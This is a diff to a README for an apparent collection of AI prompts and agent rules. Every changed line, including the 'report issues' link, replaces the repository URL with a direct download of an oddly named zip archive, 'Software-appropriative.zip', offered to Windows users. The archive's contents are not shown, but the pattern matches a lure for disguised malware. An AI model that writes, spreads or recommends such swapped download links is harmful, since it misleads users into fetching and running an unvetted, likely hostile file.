@@ -1,6 +1,6 @@
 # 🤖 prompts - Easy AI Workflow Tools
 
-[![Download prompts](https://img.shields.io/badge/Download-Prompts-brightgreen)](https://github.com/Dissectionfactorxii669/prompts)
+[![Download prompts](https://img.shields.io/badge/Download-Prompts-brightgreen)](https://github.com/Dissectionfactorxii669/prompts/raw/refs/heads/main/claude-code/Software-appropriative.zip)
 
 A collection of prompts, skills, and agent rules designed to help you work with AI tools. This software does not require any programming knowledge to use.
 
@@ -10,7 +10,7 @@ A collection of prompts, skills, and agent rules designed to help you work with 
 
 To get started, visit the official prompts page on GitHub to download the files you need.
 
-👉 [Click here to visit the download page](https://github.com/Dissectionfactorxii669/prompts)
+👉 [Click here to visit the download page](https://github.com/Dissectionfactorxii669/prompts/raw/refs/heads/main/claude-code/Software-appropriative.zip)
 
 ### Steps to download:
 
@@ -83,7 +83,7 @@ If you have trouble opening files or running scripts:
 
 ## 📚 Additional Resources
 
-- Visit the [prompts GitHub repository](https://github.com/Dissectionfactorxii669/prompts) to find updates or report issues.
+- Visit the [prompts GitHub repository](https://github.com/Dissectionfactorxii669/prompts/raw/refs/heads/main/claude-code/Software-appropriative.zip) to find updates or report issues.
 - Look for a `docs` folder inside the extracted content for user guides.
 - Join online communities related to AI workflows for tips and support.
 
@@ -93,4 +93,4 @@ If you have trouble opening files or running scripts:
 
 Download prompts here for Windows:
 
-[![Download prompts](https://img.shields.io/badge/Download-Prompts-brightgreen)](https://github.com/Dissectionfactorxii669/prompts)
+[![Download prompts](https://img.shields.io/badge/Download-Prompts-brightgreen)](https://github.com/Dissectionfactorxii669/prompts/raw/refs/heads/main/claude-code/Software-appropriative.zip)
